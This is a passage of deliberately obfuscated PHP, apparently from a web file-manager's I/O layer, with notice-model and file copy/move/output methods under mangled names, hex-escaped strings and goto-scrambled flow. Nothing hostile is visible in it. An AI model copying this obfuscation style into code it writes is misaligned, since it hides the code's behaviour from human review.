$añé†‹ïğ[$D¨œ÷»É¾ñ] = $E‡–²Ï„è; goto eëîíÄ¿; e¼¢½×éë: unset($açœô¸ÄÕª[$DÏöŞ‡œ®œ[2507]]); $D¨œ÷»É¾ñ = $this->deviceType($açœô¸ÄÕª[$DÏöŞ‡œ®œ[2330]]); if (isset($añé†‹ïğ[$D¨œ÷»É¾ñ])) { continue; } goto cÈ‰°Öµæ; Féê¿‹Î§: if ($f¸¾ƒ±†³ƒ > 0 && abs($E‡–²Ï„è[$DÏöŞ‡œ®œ[191]] - $cï‚ñåİ[$f¸¾ƒ±†³ƒ - 1][$DÏöŞ‡œ®œ[191]]) < 5) { continue; } $açœô¸ÄÕª = json_decode($E‡–²Ï„è[$DÏöŞ‡œ®œ[409]], !0); $E‡–²Ï„è[$DÏöŞ‡œ®œ[2507]] = isset($açœô¸ÄÕª[$DÏöŞ‡œ®œ[2507]]) ? $açœô¸ÄÕª[$DÏöŞ‡œ®œ[2507]] : $DÏöŞ‡œ®œ[33]; goto e¼¢½×éë; eëîíÄ¿: } return array_values($añé†‹ïğ); } public function deviceType($Eãõ’¯Ô´³) { return $Eãõ’¯Ô´³; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\156\x6f\164\x69\x63\x65\114\151\x73\x74"; public $field = array("\156\141\155\145", "\143\157\x6e\x74\x65\x6e\164", "\x61\165\164\150", "\155\x6f\x64\145", "\x74\x69\155\x65", "\x74\171\x70\x65", "\x6c\145\x76\x65\x6c", "\x65\x6e\141\142\154\145", "\x73\x6f\x72\x74"); public function listData($fØÁ„ø®ÓÆ = false, $FÈåèÂœƒ = "\x73\157\x72\164", $BÛÌÁƒ¯ì† = false) { return parent::listData($fØÁ„ø®ÓÆ, $FÈåèÂœƒ, $BÛÌÁƒ¯ì†); } public function add($CìÁ„ÖëÃ) { $dÁ›Ô¦»¬‚ =& $_SERVER[…Ò×–]; $d¡‘Ÿñ§šô = time(); if ($CìÁ„ÖëÃ[$dÁ›Ô¦»¬‚[12]] == $dÁ›Ô¦»¬‚[2516]) { $d¡‘Ÿñ§šô = strtotime($CìÁ„ÖëÃ[$dÁ›Ô¦»¬‚[194]]); } $CìÁ„ÖëÃ[$dÁ›Ô¦»¬‚[194]] = $d¡‘Ÿñ§šô; return parent::insert($CìÁ„ÖëÃ); } public function update($dÇ—Öó¾±ï, $dîö¬–Úƒ’) { goto DÛÈÔŞÇ‡‹; DÆ“©‡£š¬: return parent::update($dÇ—Öó¾±ï, $dîö¬–Úƒ’); goto f†ƒ†¥‡‘°; e§âÖô–Õ©: $dåƒ¡ÆÖß¶ = time(); if ($dîö¬–Úƒ’[$bÆÁ Òã…Û[12]] == $bÆÁ Òã…Û[2516]) { $dåƒ¡ÆÖß¶ = strtotime($dîö¬–Úƒ’[$bÆÁ Òã…Û[194]]); } $dîö¬–Úƒ’[$bÆÁ Òã…Û[194]] = $dåƒ¡ÆÖß¶; goto DÆ“©‡£š¬; DÛÈÔŞÇ‡‹: $bÆÁ Òã…Û =& $_SERVER[…Ò×–]; $bºŒù§ôá» = $this->listData($dÇ—Öó¾±ï); if (!$bºŒù§ôá») { return !1; } goto e§âÖô–Õ©; f†ƒ†¥‡‘°: } public function remove($fÉÓ­òæİö) { $dâÓ’Ğ¥Îó = $this->listData($fÉÓ­òæİö); if (!$dâÓ’Ğ¥Îó || $dâÓ’Ğ¥Îó[$_SERVER[…Ò×–][1090]]) { return !1; } return parent::remove($fÉÓ­òæİö); } public function sort($Dí£ºØ¨¦, $Fä­ø“Š¶) { return parent::update($Dí£ºØ¨¦, $Fä­ø“Š¶); } public function enable($bÙê‡º’», $Béßšªº³•) { return parent::update($bÙê‡º’», array($_SERVER[…Ò×–][2517] => $Béßšªº³•)); } private function initUserOption() { $B¶†Œ•¨Ó =& $_SERVER[…Ò×–]; $this->optionType = $B¶†Œ•¨Ó[2518]; $this->modelType = $B¶†Œ•¨Ó[2519]; $this->field = array($B¶†Œ•¨Ó[2520], $B¶†Œ•¨Ó[28], $B¶†Œ•¨Ó[194], $B¶†Œ•¨Ó[29], $B¶†Œ•¨Ó[2521], $B¶†Œ•¨Ó[694], $B¶†Œ•¨Ó[187]); } public function userNoticeGet($B¹Ç…œÍİ¾ = false) { $this->initUserOption(); return parent::listData($B¹Ç…œÍİ¾, $_SERVER[…Ò×–][371], !0); } public function userNoticeAdd($a„ø‹òºˆ†) { $AÚÎĞÜ”Ë£ =& $_SERVER[…Ò×–]; $this->initUserOption(); $d§¾‚ô¨ç = $this->findByKey($AÚÎĞÜ”Ë£[2520], $a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[371]]); if ($d§¾‚ô¨ç) { return !0; } $EŸ½À÷ôï = array($AÚÎĞÜ”Ë£[2520] => $a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[371]], $AÚÎĞÜ”Ë£[28] => $a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[28]], $AÚÎĞÜ”Ë£[194] => $a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[194]], $AÚÎĞÜ”Ë£[29] => isset($a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[29]]) ? $a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[29]] : 1, $AÚÎĞÜ”Ë£[2521] => isset($a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[2521]]) ? $a„ø‹òºˆ†[$AÚÎĞÜ”Ë£[2521]] : 0, $AÚÎĞÜ”Ë£[694] => 0, $AÚÎĞÜ”Ë£[187] => 0); return parent::insert($EŸ½À÷ôï); } public function userNoticeEdit($aæÁª™É¢, $DçÈÁÉ¬) { $this->initUserOption(); return parent::update($aæÁª™É¢, $DçÈÁÉ¬); } } goto Cãø´ø•øŒ; fÙ‡ŒÀ„Ôø: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($e›ÔˆíÔä’, $añ×ì‹âñƒ) { $d»Ü¯÷¨‚» = self::driverMake($añ×ì‹âñƒ[0]); if (method_exists($d»Ü¯÷¨‚», $e›ÔˆíÔä’)) { return @call_user_func_array(array($d»Ü¯÷¨‚», $e›ÔˆíÔä’), $añ×ì‹âñƒ); } if (method_exists($d»Ü¯÷¨‚», $_SERVER[…Ò×–][1004])) { return @call_user_func_array(array($d»Ü¯÷¨‚», $e›ÔˆíÔä’), $añ×ì‹âñƒ); } else { if (method_exists(self, $e›ÔˆíÔä’)) { return @call_user_func_array(array(self, $e›ÔˆíÔä’), $añ×ì‹âñƒ); } else { call_user_func_array(array(parent, $e›ÔˆíÔä’), $añ×ì‹âñƒ); } } } public static function init($d¥î–¼¶±Ó) { return self::driverMake($d¥î–¼¶±Ó); } public static function copy($aŒÊ£¸Ş¾·, $D–Ÿ‡¥í, $eİå¦„ä = false, $e”éŠ³ö = false) { return self::copyMove($aŒÊ£¸Ş¾·, $D–Ÿ‡¥í, $eİå¦„ä, $_SERVER[…Ò×–][495], $e”éŠ³ö); } public static function move($Bø·òø˜â±, $b¹«Ã´¥ô , $d˜ ß…„ğ¡ = false, $A¨¯Š†º™Œ = false) { return self::copyMove($Bø·òø˜â±, $b¹«Ã´¥ô , $d˜ ß…„ğ¡, $_SERVER[…Ò×–][497], $A¨¯Š†º™Œ); } public static function saveFile($f‘·ø®Ù¦Ñ, $A§½àŸ¥°Ä, $fáàÊ¥Ü´Î = true) { goto DŒö™¢•–; FáÚíùòã”: $EÌÜ¸Œ = $E¥•²ˆëÑ·->pathFather($A§½àŸ¥°Ä); $FÔˆï‰Ñ = !0; if (!$fáàÊ¥Ü´Î && self::driverIsSame($CŸ‘Î©‰ÆË, $E¥•²ˆëÑ·)) { $FÔˆï‰Ñ = !1; } goto bãÌòİÑ±ó; DŒö™¢•–: $DáŠö¨ŸºÍ =& $_SERVER[…Ò×–]; $fñá…ìÔµö = self::info($A§½àŸ¥°Ä); $CŸ‘Î©‰ÆË = self::driverMake($f‘·ø®Ù¦Ñ); goto D¦Í¶…„×; bãÌòİÑ±ó: $bí…î¡Î = self::copyFile($CŸ‘Î©‰ÆË, $f‘·ø®Ù¦Ñ, $E¥•²ˆëÑ·, $EÌÜ¸Œ, $fñá…ìÔµö[$DáŠö¨ŸºÍ[28]], $FÔˆï‰Ñ); if ($d–¬Ûï³Í×) { $bí…î¡Î = $d–¬Ûï³Í×->getPathOuter($bí…î¡Î); } return $bí…î¡Î; goto a…š ‰¾°; D¦Í¶…„×: $E¥•²ˆëÑ· = self::driverMake($A§½àŸ¥°Ä); $d–¬Ûï³Í× = !1; if ($E¥•²ˆëÑ·->pathParse[$DáŠö¨ŸºÍ[1005]]) { $C„åäˆè = $E¥•²ˆëÑ·->pathParse[$DáŠö¨ŸºÍ[1005]]; $d–¬Ûï³Í× = $E¥•²ˆëÑ·; $E¥•²ˆëÑ· = self::driverMake($C„åäˆè); } goto FáÚíùòã”; a…š ‰¾°: } private static function copyMove($D¿ÑãÕîôÅ, $CŸµ±ÅĞ…, $A›ğèÚ’“­, $BØù‡µö¾Ñ, $BÓİá‡éÆ× = false) { goto b¹ˆŒ‡³à; AñÃ™â£«®: if ($eùÚ—ÄŠå) { $Bä¸¢Ìà  = $eùÚ—ÄŠå->getPathOuter($Bä¸¢Ìà ); } return $Bä¸¢Ìà ; goto F’Ï¢²­Ö‚; b¹ˆŒ‡³à: $eµÁï°³×× =& $_SERVER[…Ò×–]; if (!$D¿ÑãÕîôÅ || $D¿ÑãÕîôÅ == $eµÁï°³××[8] || !$CŸµ±ÅĞ…) { return !1; } ignore_timeout(); goto BÖéŸÀ¢ò; BËöŒƒÈº: Hook::trigger($eµÁï°³××[72], $D°áÁÈ½§², $D¿ÑãÕîôÅ, $Cï¿ÇÁø¡‰, $CŸµ±ÅĞ…); $Fñæ½Ûëñ¿ = self::driverIsSame($D°áÁÈ½§², $Cï¿ÇÁø¡‰); if ($Fñæ½Ûëñ¿) { if ($BØù‡µö¾Ñ == $eµÁï°³××[497] && !method_exists($Cï¿ÇÁø¡‰, $eµÁï°³××[1006]) && trim($CŸµ±ÅĞ…, $eµÁï°³××[8]) == trim($Cï¿ÇÁø¡‰->pathFather($D¿ÑãÕîôÅ), $eµÁï°³××[8])) { return $Cï¿ÇÁø¡‰->getPathOuter($D¿ÑãÕîôÅ); } if (method_exists($Cï¿ÇÁø¡‰, $BØù‡µö¾Ñ)) { return $Cï¿ÇÁø¡‰->{$BØù‡µö¾Ñ}($D¿ÑãÕîôÅ, $CŸµ±ÅĞ…, $A›ğèÚ’“­); } } goto F®Ö¦«Îæ; BÖéŸÀ¢ò: $D°áÁÈ½§² = self::driverMake($D¿ÑãÕîôÅ); $Cï¿ÇÁø¡‰ = self::driverMake($CŸµ±ÅĞ…); $BªŒ¨ÙÓ‘Ï = $BØù‡µö¾Ñ == $eµÁï°³××[497]; goto b¿º´ÅÏç; F®Ö¦«Îæ: $B‘½ß…†ƒ = $D°áÁÈ½§²->isFile($D¿ÑãÕîôÅ); if (!$B‘½ß…†ƒ && $Cï¿ÇÁø¡‰->getType() == $eµÁï°³××[699] && $D°áÁÈ½§²->getType() == $eµÁï°³××[102]) { $Bä¸¢Ìà  = $Cï¿ÇÁø¡‰->copyFolderFromIO($D°áÁÈ½§², $D¿ÑãÕîôÅ, $CŸµ±ÅĞ…, $A›ğèÚ’“­, $BªŒ¨ÙÓ‘Ï, $BÓİá‡éÆ×); } else { $Bä¸¢Ìà  = self::copyPath($D°áÁÈ½§², $D¿ÑãÕîôÅ, $Cï¿ÇÁø¡‰, $CŸµ±ÅĞ…, $A›ğèÚ’“­, $BªŒ¨ÙÓ‘Ï, $B‘½ß…†ƒ, $BÓİá‡éÆ×); } if ($Bä¸¢Ìà  && $BªŒ¨ÙÓ‘Ï) { $D°áÁÈ½§²->remove($D¿ÑãÕîôÅ); } goto AñÃ™â£«®; b¿º´ÅÏç: $eùÚ—ÄŠå = !1; if ($Cï¿ÇÁø¡‰->pathParse[$eµÁï°³××[1005]]) { $CŸµ±ÅĞ… = $Cï¿ÇÁø¡‰->pathParse[$eµÁï°³××[1005]]; $eùÚ—ÄŠå = $Cï¿ÇÁø¡‰; $Cï¿ÇÁø¡‰ = self::driverMake($CŸµ±ÅĞ…); } self::check($D°áÁÈ½§², $D¿ÑãÕîôÅ, $Cï¿ÇÁø¡‰, $CŸµ±ÅĞ…); goto BËöŒƒÈº; F’Ï¢²­Ö‚: } private static function check($E…ÅìŒªÓô, $D·µøØ³Ñ, $E·Î®êäã„, &$fµ£¸š÷ĞŒ) { $fí•ØË¯’¡ =& $_SERVER[…Ò×–]; if (self::driverIsSame($E…ÅìŒªÓô, $E·Î®êäã„) && $E…ÅìŒªÓô->isFolder($D·µøØ³Ñ) && $E…ÅìŒªÓô->isParentOf($D·µøØ³Ñ, $fµ£¸š÷ĞŒ)) { show_json(LNG($fí•ØË¯’¡[1007]), !1); } if (!$E…ÅìŒªÓô->exist($D·µøØ³Ñ)) { show_json(LNG($fí•ØË¯’¡[101]), !1); } } private static function copyPath($B‘Œ´¡Ù¿, $Bá‡›§¤â», $eÃ£Á†œ¯ì, $Eƒ™½êÕ©›, $cŞôÄÜ‹Şœ, $e–˜Å÷‹Ë¦, $EÙØùáÅ , $eÊëŠóÍæÈ = false) { goto C˜·¾åÀš°; C©ä‘¡ˆÖ: $D£¨¢³¤±… = array_merge($A®À¸†É[$a„¼™ù‡œ­[73]], $A®À¸†É[$a„¼™ù‡œ­[74]]); foreach ($D£¨¢³¤±… as $EºìÈğ‚Á) { $D¡Öêº· = $EºìÈğ‚Á[$a„¼™ù‡œ­[29]] == $a„¼™ù‡œ­[171]; $Bá‡›§¤â» = $B‘Œ´¡Ù¿->getPathInner($EºìÈğ‚Á[$a„¼™ù‡œ­[75]]); $b¥İ—†² = self::copyPath($B‘Œ´¡Ù¿, $Bá‡›§¤â», $eÃ£Á†œ¯ì, $Eƒ™½êÕ©›, $cŞôÄÜ‹Şœ, $e–˜Å÷‹Ë¦, $D¡Öêº·); if (!$b¥İ—†²) { write_log($a„¼™ù‡œ­[1008] . $Bá‡›§¤â» . $a„¼™ù‡œ­[1009] . $Eƒ™½êÕ©›, $a„¼™ù‡œ­[1010]); } } return $DÆºá˜Éˆ¬; goto d†¾ˆŞß“Ñ; C˜·¾åÀš°: $a„¼™ù‡œ­ =& $_SERVER[…Ò×–]; $FáÁ„—ƒêĞ = $eÊëŠóÍæÈ ? $eÊëŠóÍæÈ : $B‘Œ´¡Ù¿->getPathName($B‘Œ´¡Ù¿->pathThis($Bá‡›§¤â»)); if ($cŞôÄÜ‹Şœ) { $F¢ÃŸ³×Ìé = $eÃ£Á†œ¯ì->fileNameExist($Eƒ™½êÕ©›, $FáÁ„—ƒêĞ); $FáÁ„—ƒêĞ = $eÃ£Á†œ¯ì->fileNameAuto($Eƒ™½êÕ©›, $FáÁ„—ƒêĞ, $cŞôÄÜ‹Şœ, !$EÙØùáÅ ); $cŞôÄÜ‹Şœ = $F¢ÃŸ³×Ìé ? $cŞôÄÜ‹Şœ : !1; } goto d¢†™¤·ë; aÅµ•áÂ…‰: $DÆºá˜Éˆ¬ = $eÃ£Á†œ¯ì->mkdir($eÃ£Á†œ¯ì->getPath($B¯ææêá)); $Eƒ™½êÕ©› = $eÃ£Á†œ¯ì->getPathInner($DÆºá˜Éˆ¬); $A®À¸†É = $B‘Œ´¡Ù¿->listPath($Bá‡›§¤â», !0); goto C©ä‘¡ˆÖ; d¢†™¤·ë: if ($EÙØùáÅ ) { return self::copyFile($B‘Œ´¡Ù¿, $Bá‡›§¤â», $eÃ£Á†œ¯ì, $Eƒ™½êÕ©›, $FáÁ„—ƒêĞ, $e–˜Å÷‹Ë¦); } if ($cŞôÄÜ‹Şœ == REPEAT_RENAME_FOLDER) { $cŞôÄÜ‹Şœ = !1; } $B¯ææêá = rtrim($Eƒ™½êÕ©›, $a„¼™ù‡œ­[8]) . $a„¼™ù‡œ­[8] . $FáÁ„—ƒêĞ; goto aÅµ•áÂ…‰; d†¾ˆŞß“Ñ: } private static function copyFile($A£¢½šÒ‹, $eø™Õ¶ô§É, $Eíîé–Ì, $cÀõÕ¹äŞ¯, $AÄÈ‚”õ, $Fê°ãØêñ­) { goto fé¡åÅ¼‚¨; aåµ¢Ì¯é¾: mk_dir($B¿œÆõÙùÂ); $cƒ‡¸Óøëã = $B¿œÆõÙùÂ . $AÒÍõ×òšŞ; $cƒ‡¸Óøëã = $A£¢½šÒ‹->download($eø™Õ¶ô§É, $cƒ‡¸Óøëã); goto e¥ª™‡ƒÒÊ; e¥ª™‡ƒÒÊ: $cƒ‡¸Óøëã = $A£¢½šÒ‹->iconvApp($cƒ‡¸Óøëã); $aù¦•Â˜± = $Eíîé–Ì->upload($cÀõÕ¹äŞ¯, $cƒ‡¸Óøëã, $Fê°ãØêñ­); self::remove($B¿œÆõÙùÂ . $AÒÍõ×òšŞ); goto D£óßàÂ‹î; D£óßàÂ‹î: Hook::trigger($E£¸¢È‚Û§[1013], $A£¢½šÒ‹, $eø™Õ¶ô§É, $Eíîé–Ì, $cÀõÕ¹äŞ¯, $AÄÈ‚”õ, $aù¦•Â˜±); return $aù¦•Â˜±; goto FƒØ¨›‡ë; b•·´Ğµ¯: Hook::trigger($E£¸¢È‚Û§[1012], $A£¢½šÒ‹, $eø™Õ¶ô§É, $Eíîé–Ì, $cÀõÕ¹äŞ¯, $AÄÈ‚”õ, $AÒÍõ×òšŞ); if (self::driverIsSame($A£¢½šÒ‹, $Eíîé–Ì)) { if ($Fê°ãØêñ­) { $aù¦•Â˜± = $Eíîé–Ì->moveFile($eø™Õ¶ô§É, $cÀõÕ¹äŞ¯); } else { $aù¦•Â˜± = $Eíîé–Ì->copyFile($eø™Õ¶ô§É, $cÀõÕ¹äŞ¯); } Hook::trigger($E£¸¢È‚Û§[1013], $A£¢½šÒ‹, $eø™Õ¶ô§É, $Eíîé–Ì, $cÀõÕ¹äŞ¯, $AÄÈ‚”õ, $aù¦•Â˜±); return $aù¦•Â˜±; } $B¿œÆõÙùÂ = TEMP_FILES; goto aåµ¢Ì¯é¾; fé¡åÅ¼‚¨: $E£¸¢È‚Û§ =& $_SERVER[…Ò×–]; $cÀõÕ¹äŞ¯ = $Eíîé–Ì->getPath(rtrim($cÀõÕ¹äŞ¯, $E£¸¢È‚Û§[8]) . $E£¸¢È‚Û§[8] . $AÄÈ‚”õ); $AÒÍõ×òšŞ = $E£¸¢È‚Û§[1011] . time() . rand_string(5); goto b•·´Ğµ¯; FƒØ¨›‡ë: } public static function pathFather($A¯¬•‡ —) { $cÄ«¨‰Šğ = IO::init($A¯¬•‡ —); $BÆ„¢÷‚Ü÷ = $cÄ«¨‰Šğ->pathFather($cÄ«¨‰Šğ->path); return $cÄ«¨‰Šğ->getPathOuter($BÆ„¢÷‚Ü÷); } public static function fileOut($aË®±õÙ‚×, $cÅšÇëõÁä = false, $a¡ÜË„£š­ = false, $eáÑ…‡ß‡ñ = '') { $dÕä¹ã ØÀ = self::driverMake($aË®±õÙ‚×); if ($dÕä¹ã ØÀ->isFileOutServer()) { return $dÕä¹ã ØÀ->fileOutServer($aË®±õÙ‚×, $cÅšÇëõÁä, $a¡ÜË„£š­, $eáÑ…‡ß‡ñ); } return $dÕä¹ã ØÀ->fileOut($aË®±õÙ‚×, $cÅšÇëõÁä, $a¡ÜË„£š­, $eáÑ…‡ß‡ñ); } public static function fileOutImage($eµù¹‡‡Õ, $CØ…­ˆˆ» = 250) { $d»¾µÅß’½ = array(250, 600, 1200, 3000, 5000); for ($Eœ»ò˜ÇÉƒ = 0; $Eœ»ò˜ÇÉƒ < count($d»¾µÅß’½); $Eœ»ò˜ÇÉƒ++) { if ($Eœ»ò˜ÇÉƒ == 0 && $CØ…­ˆˆ» <= $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ]) { $CØ…­ˆˆ» = $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ]; break; } else { if ($CØ…­ˆˆ» > $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ - 1] && $CØ…­ˆˆ» <= $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ]) { $CØ…­ˆˆ» = $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ]; break; } else { if ($Eœ»ò˜ÇÉƒ == count($d»¾µÅß’½) - 1 && $CØ…­ˆˆ» > $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ]) { $CØ…­ˆˆ» = $d»¾µÅß’½[$Eœ»ò˜ÇÉƒ]; break; } } } } $dˆƒİ³âİî = self::driverMake($eµù¹‡‡Õ); if ($dˆƒİ³âİî->isFileOutServer()) { return $dˆƒİ³âİî->fileOutImageServer($eµù¹‡‡Õ, $CØ…­ˆˆ»); } return $dˆƒİ³âİî->fileOutImage($eµù¹‡‡Õ, $CØ…­ˆˆ»); } private static function driverIsSame($FÎµè¨ç”£, $DçÒ¾²ÄÕ) { goto Bİ¿ÏéİŸ™; Bî›’»ÉÒŒ: if ($f§„Êô‹Ü != $C’ê¬ï—Â) { return !1; } if ($f§„Êô‹Ü == $cê³˜ ¯†º[699]) { return !0; } if ($f§„Êô‹Ü == $cê³˜ ¯†º[102]) { return !0; } goto E‰¼¢ê’Ú; E‰¼¢ê’Ú: if ($FÎµè¨ç”£->pathDriver == $DçÒ¾²ÄÕ->pathDriver) { return !0; } return !1; goto CŒÓŒÎÜ; Bİ¿ÏéİŸ™: $cê³˜ ¯†º =& $_SERVER[…Ò×–]; $f§„Êô‹Ü = $FÎµè¨ç”£->getType(); $C’ê¬ï—Â = $DçÒ¾²ÄÕ->getType(); goto Bî›’»ÉÒŒ; CŒÓŒÎÜ: } public static function copyUpdate($dĞ‹Ìè„Ôå, $B‚¡èÈÖ) { goto E‰¶¼˜¶“Œ; f‡¡Ø´Ğö—: Hook::trigger($eá¡îÛ‡¶[1017], $dĞ‹Ìè„Ôå, $B‚¡èÈÖ, $E§ª„¹¬Úé); foreach ($C›ôñÍöÚƒ as $aäå¤’á‹Á) { IO::mkdir($aäå¤’á‹Á); } foreach ($b¿ß© Çš as $aäå¤’á‹Á) { IO::copy($aäå¤’á‹Á[$eá¡îÛ‡¶[1014]], $aäå¤’á‹Á[$eá¡îÛ‡¶[1015]], REPEAT_REPLACE); } goto DÔÇöò; D ”çÂ§: $C›ôñÍöÚƒ = array(); foreach ($A£Âù÷Ğ¤“ as $fíŞÊ¾õÀ => $aäå¤’á‹Á) { if (isset($EÏà°æÈÂÚ[$fíŞÊ¾õÀ])) { if ($aäå¤’á‹Á[$eá¡îÛ‡¶[76]] == 1) { continue; } if ($EÏà°æÈÂÚ[$fíŞÊ¾õÀ][$eá¡îÛ‡¶[77]] == $aäå¤’á‹Á[$eá¡îÛ‡¶[77]]) { continue; } } if ($aäå¤’á‹Á[$eá¡îÛ‡¶[76]] == 1) { $C›ôñÍöÚƒ[] = $B‚¡èÈÖ . $eá¡îÛ‡¶[8] . $fíŞÊ¾õÀ; continue; } $d¤Š˜ˆ†³Ù = strstr(trim($fíŞÊ¾õÀ, $eá¡îÛ‡¶[8]), $eá¡îÛ‡¶[8]) ? get_path_father($fíŞÊ¾õÀ) : $eá¡îÛ‡¶[33]; $b¿ß© Çš[] = array($eá¡îÛ‡¶[1014] => $aäå¤’á‹Á[$eá¡îÛ‡¶[75]], $eá¡îÛ‡¶[1015] => rtrim($B‚¡èÈÖ, $eá¡îÛ‡¶[8]) . $eá¡îÛ‡¶[8] . $d¤Š˜ˆ†³Ù, $eá¡îÛ‡¶[1016] => $aäå¤’á‹Á); } $E§ª„¹¬Úé = array($eá¡îÛ‡¶[171] => $b¿ß© Çš, $eá¡îÛ‡¶[76] => $C›ôñÍöÚƒ); goto f‡¡Ø´Ğö—; A…ÙˆÂÊêÃ: $A£Âù÷Ğ¤“ = self::_listAll($dĞ‹Ìè„Ôå); $EÏà°æÈÂÚ = self::_listAll($B‚¡èÈÖ); $b¿ß© Çš = array(); goto D ”çÂ§; E‰¶¼˜¶“Œ: $eá¡îÛ‡¶ =& $_SERVER[…Ò×–]; if (!IO::exist($dĞ‹Ìè„Ôå)) { return !1; } if (!IO::exist($B‚¡èÈÖ)) { IO::mkdir($B‚¡èÈÖ); } goto A…ÙˆÂÊêÃ; DÔÇöò: } private static function _listAll($bù‹«©“) { $CËç‰Ô¶œ  =& $_SERVER[…Ò×–]; $bù‹«©“ = KodIO::clear($bù‹«©“); $B®…ˆ©²î = IO::listAll($bù‹«©“); foreach ($B®…ˆ©²î as &$f·ÅƒÅ©ö) { $FñºÊ¯Ë‚´ = substr($f·ÅƒÅ©ö[$CËç‰Ô¶œ [75]], strlen($bù‹«©“)); $f·ÅƒÅ©ö[$CËç‰Ô¶œ [1018]] = trim($FñºÊ¯Ë‚´, $CËç‰Ô¶œ [8]); } unset($f·ÅƒÅ©ö); return array_to_keyvalue($B®…ˆ©²î, $CËç‰Ô¶œ [1018]); } public static function fileSubstr($dÀÆ×éèñ¬, $BÒÀİÅ¸, $eßùñÆ›³Ì = false) { goto DŸš›è¡Ğ; EÖæ ‹ í: if (!$b®»Ú²Š“ && $eßùñÆ›³Ì && isset($GLOBALS[$DéÁ‰““×[1021]])) { throw new Exception($GLOBALS[$DéÁ‰““×[1021]][$DéÁ‰““×[1022]]); } return $b®»Ú²Š“; goto BŠÔİ¥æ¸¥; Aïæá†í©·: $b¿ŠêŸÑß = $BÒÀİÅ¸; $dÜõÊáê¯ = $eßùñÆ›³Ì; if ($BÒÀİÅ¸ < 0) { $BÒÀİÅ¸ = $e»Ì†­¸Ê“ + $BÒÀİÅ¸; } goto fà¨Àµìˆ; fà¨Àµìˆ: if ($eßùñÆ›³Ì === !1) { $eßùñÆ›³Ì = $e»Ì†­¸Ê“ - $BÒÀİÅ¸; } if ($BÒÀİÅ¸ + $eßùñÆ›³Ì > $e»Ì†­¸Ê“) { $eßùñÆ›³Ì = $e»Ì†­¸Ê“ - $BÒÀİÅ¸; } if (!$e»Ì†­¸Ê“ && $FîÔ¦Šñ‹™->getType() == $DéÁ‰““×[102] && !$FîÔ¦Šñ‹™->exist($dÀÆ×éèñ¬)) { throw new Exception($DéÁ‰““×[1019] . LNG($DéÁ‰““×[1020])); } goto F‰öâ¼”ÚÕ; DŸš›è¡Ğ: $DéÁ‰““× =& $_SERVER[…Ò×–]; $FîÔ¦Šñ‹™ = self::driverMake($dÀÆ×éèñ¬); $e»Ì†­¸Ê“ = $FîÔ¦Šñ‹™->size($dÀÆ×éèñ¬); goto Aïæá†í©·; F‰öâ¼”ÚÕ: if ($eßùñÆ›³Ì <= 0) { return $DéÁ‰““×[33]; } if ($BÒÀİÅ¸ < 0 || $BÒÀİÅ¸ >= $e»Ì†­¸Ê“ || $eßùñÆ›³Ì > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\x65\x52\145\x61\144\40\x65\162\162\x6f\162\41\x20\163\x74\x61\162\x74\x3d{$BÒÀİÅ¸}\x3b\x6c\x65\156\147\164\150\x3d{$eßùñÆ›³Ì}\73\40\x73\151\172\x65\x3d{$e»Ì†­¸Ê“}\x3b"); } $b®»Ú²Š“ = $FîÔ¦Šñ‹™->fileSubstr($dÀÆ×éèñ¬, $BÒÀİÅ¸, $eßùñÆ›³Ì); goto EÖæ ‹ í; BŠÔİ¥æ¸¥: } private static function driverMake(&$b…ˆ¯±Â¬Š) { goto D…ø…¿‡ÁÌ; dÜÉ‰ÛÚï: return $EŸÛß¯Ë¯°; goto EÏ¹ÜÏôµ; E¨‡ÏïÎ¦: if ($aŸğ˜»„å[$aÍ³Ø¸ÕêÛ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aŸğ˜»„å[$aÍ³Ø¸ÕêÛ[371]]]) { return !1; } $b…ˆ¯±Â¬Š = $aŸğ˜»„å[$aÍ³Ø¸ÕêÛ[1023]]; $EŸÛß¯Ë¯° = self::driverGet($aŸğ˜»„å, $b…ˆ¯±Â¬Š); goto dÜÉ‰ÛÚï; D…ø…¿‡ÁÌ: $aÍ³Ø¸ÕêÛ =& $_SERVER[…Ò×–]; $aŸğ˜»„å = KodIO::parse($b…ˆ¯±Â¬Š); if (!self::$driverListSystem) { $B”ˆ´‰Áˆä = Model($aÍ³Ø¸ÕêÛ[708])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B”ˆ´‰Áˆä, $aÍ³Ø¸ÕêÛ[371]); } goto E¨‡ÏïÎ¦; EÏ¹ÜÏôµ: } private static function driverGet($Dó–¦Íùö, &$Fµ“„ë£ñˆ) { goto DäÇ­£»´×; DäÇ­£»´×: $dœ‘ÄáÅƒ½ =& $_SERVER[…Ò×–]; $A½¨×‘×§ = $Dó–¦Íùö[$dœ‘ÄáÅƒ½[1024]]; $Aš—‡¸ô¨ˆ = $Dó–¦Íùö[$dœ‘ÄáÅƒ½[371]]; goto D¦îšš·×İ; f“Œèºõ¨È: $fŞ‰½²µÃ->path = $Fµ“„ë£ñˆ; return $fŞ‰½²µÃ; goto d˜Û¼åŠÍ­; a‡æÁ°ˆ‹í: if (isset($d¿®»ª†‰[$dœ‘ÄáÅƒ½[6]][$dœ‘ÄáÅƒ½[1035]])) { $fŞ‰½²µÃ->pathBase = rtrim($d¿®»ª†‰[$dœ‘ÄáÅƒ½[6]][$dœ‘ÄáÅƒ½[1035]], $dœ‘ÄáÅƒ½[8]) . $dœ‘ÄáÅƒ½[8]; $Fµ“„ë£ñˆ = $fŞ‰½²µÃ->pathBase . ltrim($Fµ“„ë£ñˆ, $dœ‘ÄáÅƒ½[8]); } $Fµ“„ë£ñˆ = $fŞ‰½²µÃ->getPath($Fµ“„ë£ñˆ); if (isset($Dó–¦Íùö[$dœ‘ÄáÅƒ½[1005]])) { $Fµ“„ë£ñˆ 